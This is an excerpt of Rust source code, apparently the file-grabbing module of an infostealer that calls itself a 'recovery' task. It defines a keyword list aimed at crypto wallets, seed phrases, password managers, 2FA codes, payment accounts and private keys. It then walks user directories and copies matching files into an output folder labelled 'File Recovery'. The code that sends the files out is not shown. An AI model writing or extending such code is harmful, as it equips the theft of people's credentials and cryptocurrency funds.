...
const KEYWORDS: &[&str] = &[
    "2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino",
    "code", "coinbase", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds",
    "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo",
    "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private",
    "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp",
    "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet",
];
...
impl RecoveryTask for FileRecoveryTask {
    ...
    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let output_root = ctx.output_dir.join("System").join("File Recovery");
        ...
        for (label, root) in directories {
            ...
            let label_dir = output_root.join(sanitize_label(&label));

            for entry in WalkDir::new(&root).follow_links(false).max_depth(5) {
                if artifacts.len() >= MAX_ARTIFACTS {
                    debug!("reached max artifact limit for file recovery");
                    break;
                }
                ...
                let _ = crate::recovery::fs::copy_file_with_structure(
                    &format!("File Recovery ({label})"),
                    path,
                    &root,
                    &label_dir,
                    &mut artifacts,
